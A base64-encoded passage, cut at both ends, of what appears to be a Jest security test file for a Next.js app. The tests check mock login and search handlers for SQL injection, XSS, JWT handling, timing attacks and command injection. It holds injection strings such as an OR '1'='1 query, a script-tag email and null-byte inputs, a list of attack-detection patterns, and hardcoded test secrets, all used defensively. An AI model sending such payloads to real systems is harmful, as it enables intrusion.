lIHBhcmFtZXRlcml6ZWQgcXVlcmllc1xuICAgIGNvbnN0IHJlc3VsdHMgPSBhd2FpdCBtb2NrUHJpc21hLnByb2R1Y3QuZmluZE1hbnkoe1xuICAgICAgd2hlcmU6IHtcbiAgICAgICAgbmFtZToge1xuICAgICAgICAgIGNvbnRhaW5zOiBzYW5pdGl6ZWRRdWVyeSxcbiAgICAgICAgICBtb2RlOiAnaW5zZW5zaXRpdmUnLFxuICAgICAgICB9LFxuICAgICAgfSxcbiAgICB9KTtcbiAgICBcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyByZXN1bHRzIH0pO1xuICB9IGNhdGNoIChlcnJvcikge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7IGVycm9yOiAnRGF0YWJhc2UgZXJyb3InIH0sIHsgc3RhdHVzOiA1MDAgfSk7XG4gIH1cbn07XG5cbi8vIEF1dGhlbnRpY2F0aW9uIGhhbmRsZXIgd2l0aCBzZWN1cml0eSBtZWFzdXJlc1xuY29uc3Qgc2VjdXJlQXV0aEhhbmRsZXIgPSBhc3luYyAocmVxOiBOZXh0UmVxdWVzdCkgPT4ge1xuICBjb25zdCBib2R5ID0gYXdhaXQgcmVxLmpzb24oKTtcbiAgY29uc3QgeyBlbWFpbCwgcGFzc3dvcmQgfSA9IGJvZHk7XG5cbiAgLy8gUmF0ZSBsaW1pdGluZyBzaW11bGF0aW9uXG4gIGNvbnN0IGNsaWVudElQID0gcmVxLmhlYWRlcnMuZ2V0KCd4LWZvcndhcmRlZC1mb3InKSB8fCAndW5rbm93bic7XG4gIFxuICAvLyBJbnB1dCB2YWxpZGF0aW9uXG4gIGlmICghZW1haWwgfHwgIXBhc3N3b3JkKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgeyBlcnJvcjogJ0VtYWlsIGFuZCBwYXNzd29yZCBhcmUgcmVxdWlyZWQnIH0sXG4gICAgICB7IHN0YXR1czogNDAwIH1cbiAgICApO1xuICB9XG5cbiAgaWYgKGVtYWlsLmxlbmd0aCA+IDI1NCB8fCBwYXNzd29yZC5sZW5ndGggPiAxMjgpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oXG4gICAgICB7IGVycm9yOiAnSW5wdXQgdG9vIGxvbmcnIH0sXG4gICAgICB7IHN0YXR1czogNDAwIH1cbiAgICApO1xuICB9XG5cbiAgLy8gRW1haWwgZm9ybWF0IHZhbGlkYXRpb25cbiAgY29uc3QgZW1haWxSZWdleCA9IC9eW15cXHNAXStAW15cXHNAXStcXC5bXlxcc0BdKyQvO1xuICBjb25zdCBoYXNDb250cm9sQ2hhcnMgPSAvW1xceDAwLVxceDFGXFx4N0ZdLy50ZXN0KGVtYWlsKSB8fCAvW1xceDAwLVxceDFGXFx4N0ZdLy50ZXN0KHBhc3N3b3JkKTtcbiAgXG4gIGlmICghZW1haWxSZWdleC50ZXN0KGVtYWlsKSB8fCBoYXNDb250cm9sQ2hhcnMpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oXG4gICAgICB7IGVycm9yOiAnSW52YWxpZCBlbWFpbCBmb3JtYXQnIH0sXG4gICAgICB7IHN0YXR1czogNDAwIH1cbiAgICApO1xuICB9XG5cbiAgLy8gQ2hlY2sgZm9yIHN1c3BpY2lvdXMgcGF0dGVybnNcbiAgY29uc3Qgc3VzcGljaW91c1BhdHRlcm5zID0gW1xuICAgIC88c2NyaXB0L2ksXG4gICAgL2phdmFzY3JpcHQ6L2ksXG4gICAgL29uXFx3Kz0vaSxcbiAgICAvXFxib3JcXGIuKlxcYjFcXHMqPVxccyoxXFxiL2ksXG4gICAgL3VuaW9uLipzZWxlY3QvaSxcbiAgICAvZHJvcC4qdGFibGUvaSxcbiAgXTtcblxuICBjb25zdCBpc1N1c3BpY2lvdXMgPSBzdXNwaWNpb3VzUGF0dGVybnMuc29tZShwYXR0ZXJuID0+IFxuICAgIHBhdHRlcm4udGVzdChlbWFpbCkgfHwgcGF0dGVybi50ZXN0KHBhc3N3b3JkKVxuICApO1xuXG4gIGlmIChpc1N1c3BpY2lvdXMpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oXG4gICAgICB7IGVycm9yOiAnSW52YWxpZCBpbnB1dCBkZXRlY3RlZCcgfSxcbiAgICAgIHsgc3RhdHVzOiA0MDAgfVxuICAgICk7XG4gIH1cblxuICB0cnkge1xuICAgIGNvbnN0IHVzZXIgPSBhd2FpdCBtb2NrUHJpc21hLnVzZXIuZmluZFVuaXF1ZSh7XG4gICAgICB3aGVyZTogeyBlbWFpbCB9LFxuICAgIH0pO1xuXG4gICAgaWYgKCF1c2VyKSB7XG4gICAgICAvLyBDb25zdGFudCB0aW1lIGRlbGF5IHRvIHByZXZlbnQgdGltaW5nIGF0dGFja3NcbiAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCAxMDApKTtcbiAgICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbihcbiAgICAgICAgeyBlcnJvcjogJ0ludmFsaWQgY3JlZGVudGlhbHMnIH0sXG4gICAgICAgIHsgc3RhdHVzOiA0MDEgfVxuICAgICAgKTtcbiAgICB9XG5cbiAgICBjb25zdCBpc1ZhbGlkID0gYXdhaXQgYmNyeXB0LmNvbXBhcmUocGFzc3dvcmQsIHVzZXIucGFzc3dvcmQpO1xuICAgIGlmICghaXNWYWxpZCkge1xuICAgICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgICB7IGVycm9yOiAnSW52YWxpZCBjcmVkZW50aWFscycgfSxcbiAgICAgICAgeyBzdGF0dXM6IDQwMSB9XG4gICAgICApO1xuICAgIH1cblxuICAgIC8vIEdlbmVyYXRlIHNlY3VyZSB0b2tlblxuICAgIGNvbnN0IHRva2VuID0gand0LnNpZ24oXG4gICAgICB7IFxuICAgICAgICB1c2VySWQ6IHVzZXIuaWQsIFxuICAgICAgICBlbWFpbDogdXNlci5lbWFpbCxcbiAgICAgICAgaWF0OiBNYXRoLmZsb29yKERhdGUubm93KCkgLyAxMDAwKSxcbiAgICAgIH0sXG4gICAgICAndGVzdC1zZWNyZXQnLFxuICAgICAgeyBcbiAgICAgICAgZXhwaXJlc0luOiAnMTVtJyxcbiAgICAgICAgaXNzdWVyOiAnbWQtc3BvcnRzJyxcbiAgICAgICAgYXVkaWVuY2U6ICdtZC1zcG9ydHMtY2xpZW50JyxcbiAgICAgIH1cbiAgICApO1xuXG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHtcbiAgICAgIHVzZXI6IHtcbiAgICAgICAgaWQ6IHVzZXIuaWQsXG4gICAgICAgIGVtYWlsOiB1c2VyLmVtYWlsLFxuICAgICAgICBuYW1lOiB1c2VyLm5hbWUsXG4gICAgICB9LFxuICAgICAgdG9rZW4sXG4gICAgfSk7XG4gIH0gY2F0Y2ggKGVycm9yKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgeyBlcnJvcjogJ0ludGVybmFsIHNlcnZlciBlcnJvcicgfSxcbiAgICAgIHsgc3RhdHVzOiA1MDAgfVxuICAgICk7XG4gIH1cbn07XG5cbmRlc2NyaWJlKCdTZWN1cml0eSBUZXN0cycsICgpID0+IHtcbiAgYmVmb3JlQWxsKCgpID0+IHtcbiAgICBwcm9jZXNzLmVudi5KV1RfU0VDUkVUID0gJ3Rlc3Qtc2VjcmV0LWtleS1mb3Itc2VjdXJpdHktdGVzdGluZyc7XG4gIH0pO1xuXG4gIGJlZm9yZUVhY2goKCkgPT4ge1xuICAgIGplc3QuY2xlYXJBbGxNb2NrcygpO1xuICB9KTtcblxuICBkZXNjcmliZSgnU1FMIEluamVjdGlvbiBQcm90ZWN0aW9uJywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgcHJldmVudCBTUUwgaW5qZWN0aW9uIGluIHNlYXJjaCBxdWVyaWVzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3Qgc3FsUGF5bG9hZHMgPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZVNRTEluamVjdGlvblBheWxvYWRzKCk7XG4gICAgICBcbiAgICAgIGZvciAoY29uc3QgcGF5bG9hZCBvZiBzcWxQYXlsb2Fkcykge1xuICAgICAgICBjb25zdCByZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KFxuICAgICAgICAgIGBodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL3NlYXJjaD9xPSR7ZW5jb2RlVVJJQ29tcG9uZW50KHBheWxvYWQpfWBcbiAgICAgICAgKTtcblxuICAgICAgICAvLyBUZXN0IHdpdGggc2VjdXJlIGhhbmRsZXJcbiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVTZWFyY2hIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgICBcbiAgICAgICAgLy8gU2hvdWxkIG5vdCByZXR1cm4gNTAwIGVycm9yIG9yIGV4cG9zZSBkYXRhYmFzZSBzdHJ1Y3R1cmVcbiAgICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykubm90LnRvQmUoNTAwKTtcbiAgICAgICAgXG4gICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7XG4gICAgICAgIGV4cGVjdChkYXRhKS5ub3QudG9IYXZlUHJvcGVydHkoJ3Jlc3VsdHMnKTtcbiAgICAgIH1cbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdXNlIHBhcmFtZXRlcml6ZWQgcXVlcmllcycsIGFzeW5jICgpID0+IHtcbiAgICAgIG1vY2tQcmlzbWEucHJvZHVjdC5maW5kTWFueS5tb2NrUmVzb2x2ZWRWYWx1ZShbXSk7XG4gICAgICBcbiAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoXG4gICAgICAgIFwiaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9zZWFyY2g/cT10ZXN0JyBPUiAnMSc9JzFcIlxuICAgICAgKTtcblxuICAgICAgYXdhaXQgc2VjdXJlU2VhcmNoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgIFxuICAgICAgLy8gVmVyaWZ5IHBhcmFtZXRlcml6ZWQgcXVlcnkgd2FzIHVzZWRcbiAgICAgIGV4cGVjdChtb2NrUHJpc21hLnByb2R1Y3QuZmluZE1hbnkpLnRvSGF2ZUJlZW5DYWxsZWRXaXRoKHtcbiAgICAgICAgd2hlcmU6IHtcbiAgICAgICAgICBuYW1lOiB7XG4gICAgICAgICAgICBjb250YWluczogXCJ0ZXN0IE9SIDExXCIsIC8vIFNhbml0aXplZFxuICAgICAgICAgICAgbW9kZTogJ2luc2Vuc2l0aXZlJyxcbiAgICAgICAgICB9LFxuICAgICAgICB9LFxuICAgICAgfSk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdYU1MgUHJvdGVjdGlvbicsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIHNhbml0aXplIFhTUyBwYXlsb2FkcyBpbiBpbnB1dCcsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IHhzc1BheWxvYWRzID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVYU1NQYXlsb2FkcygpO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IHBheWxvYWQgb2YgeHNzUGF5bG9hZHMpIHtcbiAgICAgICAgY29uc3QgcmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdChcbiAgICAgICAgICBgaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9zZWFyY2g/cT0ke2VuY29kZVVSSUNvbXBvbmVudChwYXlsb2FkKX1gXG4gICAgICAgICk7XG5cbiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVTZWFyY2hIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpO1xuICAgICAgICBcbiAgICAgICAgLy8gU2hvdWxkIG5vdCBjb250YWluIHNjcmlwdCB0YWdzIG9yIGphdmFzY3JpcHRcbiAgICAgICAgaWYgKGRhdGEucmVzdWx0cykge1xuICAgICAgICAgIGNvbnN0IHJlc3BvbnNlU3RyID0gSlNPTi5zdHJpbmdpZnkoZGF0YSk7XG4gICAgICAgICAgZXhwZWN0KHJlc3BvbnNlU3RyKS5ub3QudG9NYXRjaCgvPHNjcmlwdC9pKTtcbiAgICAgICAgICBleHBlY3QocmVzcG9uc2VTdHIpLm5vdC50b01hdGNoKC9qYXZhc2NyaXB0Oi9pKTtcbiAgICAgICAgICBleHBlY3QocmVzcG9uc2VTdHIpLm5vdC50b01hdGNoKC9vblxcdys9L2kpO1xuICAgICAgICB9XG4gICAgICB9XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHJlamVjdCBzdXNwaWNpb3VzIGlucHV0IHBhdHRlcm5zJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgcmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgYm9keToge1xuICAgICAgICAgIGVtYWlsOiAnPHNjcmlwdD5hbGVydChcInhzc1wiKTwvc2NyaXB0PkB0ZXN0LmNvbScsXG4gICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgIH0sXG4gICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICB9LFxuICAgICAgfSk7XG5cbiAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIocmVxdWVzdCk7XG4gICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpO1xuICAgICAgXG4gICAgICBleHBlY3QocmVzcG9uc2Uuc3RhdHVzKS50b0JlKDQwMCk7XG4gICAgICBleHBlY3QoZGF0YS5lcnJvcikudG9CZSgnSW52YWxpZCBpbnB1dCBkZXRlY3RlZCcpO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnQXV0aGVudGljYXRpb24gU2VjdXJpdHknLCAoKSA9PiB7XG4gICAgY29uc3QgdGVzdFNlY3JldCA9ICd0ZXN0LXNlY3JldCc7XG4gICAgXG4gICAgaXQoJ3Nob3VsZCByZWplY3QgaW52YWxpZCBKV1QgdG9rZW5zJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgaW52YWxpZFRva2VucyA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlSW52YWxpZFRva2VucygpO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IHRva2VuIG9mIGludmFsaWRUb2tlbnMpIHtcbiAgICAgICAgZXhwZWN0KCgpID0+IHtcbiAgICAgICAgICBqd3QudmVyaWZ5KHRva2VuLCB0ZXN0U2VjcmV0KTtcbiAgICAgICAgfSkudG9UaHJvdygpO1xuICAgICAgfVxuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCByZWplY3QgZXhwaXJlZCB0b2tlbnMnLCBhc3luYyAoKSA9PiB7XG4gICAgICBjb25zdCBleHBpcmVkVG9rZW4gPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZUV4cGlyZWRKV1Qoe1xuICAgICAgICB1c2VySWQ6IDEsXG4gICAgICAgIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScsXG4gICAgICB9LCB0ZXN0U2VjcmV0KTtcbiAgICAgIFxuICAgICAgZXhwZWN0KCgpID0+IHtcbiAgICAgICAgand0LnZlcmlmeShleHBpcmVkVG9rZW4sIHRlc3RTZWNyZXQpO1xuICAgICAgfSkudG9UaHJvdygnand0IGV4cGlyZWQnKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdXNlIHNlY3VyZSBwYXNzd29yZCBoYXNoaW5nJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgcGFzc3dvcmQgPSAndGVzdHBhc3N3b3JkMTIzJztcbiAgICAgIGNvbnN0IGhhc2ggPSBhd2FpdCBTZWN1cml0eVRlc3RVdGlscy5oYXNoUGFzc3dvcmQocGFzc3dvcmQpO1xuICAgICAgXG4gICAgICAvLyBTaG91bGQgYmUgYmNyeXB0IGhhc2hcbiAgICAgIGV4cGVjdChoYXNoKS50b01hdGNoKC9eXFwkMlthYnldXFwkXFxkK1xcJC8pO1xuICAgICAgXG4gICAgICAvLyBTaG91bGQgbm90IGJlIHRoZSBvcmlnaW5hbCBwYXNzd29yZFxuICAgICAgZXhwZWN0KGhhc2gpLm5vdC50b0JlKHBhc3N3b3JkKTtcbiAgICAgIFxuICAgICAgLy8gU2hvdWxkIHZlcmlmeSBjb3JyZWN0bHlcbiAgICAgIGNvbnN0IGlzVmFsaWQgPSBhd2FpdCBiY3J5cHQuY29tcGFyZShwYXNzd29yZCwgaGFzaCk7XG4gICAgICBleHBlY3QoaXNWYWxpZCkudG9CZSh0cnVlKTtcbiAgICAgIFxuICAgICAgLy8gU2hvdWxkIG5vdCB2ZXJpZnkgd2l0aCB3cm9uZyBwYXNzd29yZFxuICAgICAgY29uc3QgaXNJbnZhbGlkID0gYXdhaXQgYmNyeXB0LmNvbXBhcmUoJ3dyb25ncGFzc3dvcmQnLCBoYXNoKTtcbiAgICAgIGV4cGVjdChpc0ludmFsaWQpLnRvQmUoZmFsc2UpO1xuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCBwcmV2ZW50IHRpbWluZyBhdHRhY2tzIGluIGF1dGhlbnRpY2F0aW9uJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgdmFsaWRFbWFpbCA9ICd0ZXN0QGV4YW1wbGUuY29tJztcbiAgICAgIGNvbnN0IGludmFsaWRFbWFpbCA9ICdub25leGlzdGVudEBleGFtcGxlLmNvbSc7XG4gICAgICBcbiAgICAgIC8vIE1vY2sgdXNlciBsb29rdXBcbiAgICAgIG1vY2tQcmlzbWEudXNlci5maW5kVW5pcXVlLm1vY2tJbXBsZW1lbnRhdGlvbigoeyB3aGVyZSB9KSA9PiB7XG4gICAgICAgIGlmICh3aGVyZS5lbWFpbCA9PT0gdmFsaWRFbWFpbCkge1xuICAgICAgICAgIHJldHVybiBQcm9taXNlLnJlc29sdmUoe1xuICAgICAgICAgICAgaWQ6IDEsXG4gICAgICAgICAgICBlbWFpbDogdmFsaWRFbWFpbCxcbiAgICAgICAgICAgIHBhc3N3b3JkOiAnJDJhJDEwJGhhc2hlZFBhc3N3b3JkJyxcbiAgICAgICAgICAgIG5hbWU6ICdUZXN0IFVzZXInLFxuICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBQcm9taXNlLnJlc29sdmUobnVsbCk7XG4gICAgICB9KTtcblxuICAgICAgY29uc3QgdmFsaWRSZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICBib2R5OiB7XG4gICAgICAgICAgZW1haWw6IHZhbGlkRW1haWwsXG4gICAgICAgICAgcGFzc3dvcmQ6ICd3cm9uZ3Bhc3N3b3JkJyxcbiAgICAgICAgfSxcbiAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgIH0sXG4gICAgICB9KTtcblxuICAgICAgY29uc3QgaW52YWxpZFJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgIGJvZHk6IHtcbiAgICAgICAgICBlbWFpbDogaW52YWxpZEVtYWlsLFxuICAgICAgICAgIHBhc3N3b3JkOiAnd3JvbmdwYXNzd29yZCcsXG4gICAgICAgIH0sXG4gICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICB9LFxuICAgICAgfSk7XG5cbiAgICAgIC8vIE1lYXN1cmUgcmVzcG9uc2UgdGltZXNcbiAgICAgIGNvbnN0IHN0YXJ0MSA9IERhdGUubm93KCk7XG4gICAgICBjb25zdCByZXNwb25zZTEgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcih2YWxpZFJlcXVlc3QpO1xuICAgICAgY29uc3QgdGltZTEgPSBEYXRlLm5vdygpIC0gc3RhcnQxO1xuXG4gICAgICBjb25zdCBzdGFydDIgPSBEYXRlLm5vdygpO1xuICAgICAgY29uc3QgcmVzcG9uc2UyID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIoaW52YWxpZFJlcXVlc3QpO1xuICAgICAgY29uc3QgdGltZTIgPSBEYXRlLm5vdygpIC0gc3RhcnQyO1xuXG4gICAgICAvLyBCb3RoIHNob3VsZCByZXR1cm4gNDAxXG4gICAgICBleHBlY3QocmVzcG9uc2UxLnN0YXR1cykudG9CZSg0MDEpO1xuICAgICAgZXhwZWN0KHJlc3BvbnNlMi5zdGF0dXMpLnRvQmUoNDAxKTtcbiAgICAgIFxuICAgICAgLy8gUmVzcG9uc2UgdGltZXMgc2hvdWxkIGJlIHNpbWlsYXIgKHdpdGhpbiA1MG1zKVxuICAgICAgZXhwZWN0KE1hdGguYWJzKHRpbWUxIC0gdGltZTIpKS50b0JlTGVzc1RoYW4oNTApO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnSW5wdXQgVmFsaWRhdGlvbicsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIHJlamVjdCBvdmVyc2l6ZWQgaW5wdXRzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgbG9uZ1N0cmluZ3MgPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZUxvbmdTdHJpbmdzKCk7XG4gICAgICBcbiAgICAgIGZvciAoY29uc3QgbG9uZ1N0cmluZyBvZiBsb25nU3RyaW5ncykge1xuICAgICAgICBjb25zdCByZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgICAgYm9keToge1xuICAgICAgICAgICAgZW1haWw6IGxvbmdTdHJpbmcsXG4gICAgICAgICAgICBwYXNzd29yZDogJ3Bhc3N3b3JkMTIzJyxcbiAgICAgICAgICB9LFxuICAgICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgICAgfSxcbiAgICAgICAgfSk7XG5cbiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgICAgXG4gICAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLnRvQmUoNDAwKTtcbiAgICAgIH1cbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdmFsaWRhdGUgZW1haWwgZm9ybWF0JywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgaW52YWxpZEVtYWlscyA9IFtcbiAgICAgICAgJ2ludmFsaWQtZW1haWwnLFxuICAgICAgICAnQGRvbWFpbi5jb20nLFxuICAgICAgICAndXNlckAnLFxuICAgICAgICAndXNlci4ubmFtZUBkb21haW4uY29tJyxcbiAgICAgICAgJ3VzZXJAZG9tYWluJyxcbiAgICAgICAgJycsXG4gICAgICAgICd1c2VyIG5hbWVAZG9tYWluLmNvbScsXG4gICAgICBdO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IGVtYWlsIG9mIGludmFsaWRFbWFpbHMpIHtcbiAgICAgICAgY29uc3QgcmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICAgIGJvZHk6IHtcbiAgICAgICAgICAgIGVtYWlsLFxuICAgICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgICAgfSxcbiAgICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICAgIH0sXG4gICAgICAgIH0pO1xuXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIocmVxdWVzdCk7XG4gICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7XG4gICAgICAgIFxuICAgICAgICBleHBlY3QocmVzcG9uc2Uuc3RhdHVzKS50b0JlKDQwMCk7XG4gICAgICAgIGV4cGVjdChkYXRhLmVycm9yKS50b0JlKCdJbnZhbGlkIGVtYWlsIGZvcm1hdCcpO1xuICAgICAgfVxuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCBoYW5kbGUgbnVsbCBieXRlcyBhbmQgc3BlY2lhbCBjaGFyYWN0ZXJzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgbWFsaWNpb3VzSW5wdXRzID0gW1xuICAgICAgICAndGVzdFxceDAwQGV4YW1wbGUuY29tJyxcbiAgICAgICAgJ3Rlc3RcXHJcXG5AZXhhbXBsZS5jb20nLFxuICAgICAgICAndGVzdFxcdEBleGFtcGxlLmNvbScsXG4gICAgICAgICd0ZXN0XFxiQGV4YW1wbGUuY29tJyxcbiAgICAgIF07XG4gICAgICBcbiAgICAgIGZvciAoY29uc3QgaW5wdXQgb2YgbWFsaWNpb3VzSW5wdXRzKSB7XG4gICAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgICBib2R5OiB7XG4gICAgICAgICAgICBlbWFpbDogaW5wdXQsXG4gICAgICAgICAgICBwYXNzd29yZDogJ3Bhc3N3b3JkMTIzJyxcbiAgICAgICAgICB9LFxuICAgICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgICAgfSxcbiAgICAgICAgfSk7XG5cbiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgICAgXG4gICAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLnRvQmUoNDAwKTtcbiAgICAgIH1cbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0NvbW1hbmQgSW5qZWN0aW9uIFByb3RlY3Rpb24nLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCBwcmV2ZW50IGNvbW1hbmQgaW5qZWN0aW9uIGluIGZpbGUgb3BlcmF0aW9ucycsICgpID0+IHtcbiAgICAgIGNvbnN0IGNvbW1hbmRQYXlsb2FkcyA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlQ29tbWFuZEluamVjdGlvblBheWxvYWRzKCk7XG4gICAgICBcbiAgICAgIGZvciAoY29uc3QgcGF5bG9hZCBvZiBjb21tYW5kUGF5bG9hZHMpIHtcbiAgICAgICAgLy8gU2ltdWxhdGUgZmlsZSBuYW1lIHZhbGlkYXRpb25cbiAgICAgICAgY29uc3QgaXNWYWxpZEZpbGVOYW1lID0gKGZpbGVuYW1lOiBzdHJpbmcpOiBib29sZWFuID0+IHtcbiAgICAgICAgICAvLyBPbmx5IGFsbG93IGFscGhhbnVtZXJpYywgZG90cywgaHlwaGVucywgYW5kIHVuZGVyc2NvcmVzXG4gICAgICAgICAgcmV0dXJuIC9eW2EtekEtWjAtOS5fLV0rJC8udGVzdChmaWxlbmFtZSk7XG4gICAgICAgIH07XG4gICAgICAgIFxuICAgICAgICBleHBlY3QoaXNWYWxpZEZpbGVOYW1lKHBheWxvYWQpKS50b0JlKGZhbHNlKTtcbiAgICAgIH1cbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0pXVCBTZWN1cml0eScsICgpID0+IHtcbiAgICBjb25zdCB0ZXN0U2VjcmV0ID0gJ3Rlc3Qtc2VjcmV0JztcbiAgICBcbiAgICBpdCgnc2hvdWxkIHVzZSBzZWN1cmUgSldUIGNvbmZpZ3VyYXRpb24nLCAoKSA9PiB7XG4gICAgICBjb25zdCBwYXlsb2FkID0geyB1c2VySWQ6IDEsIGVtYWlsO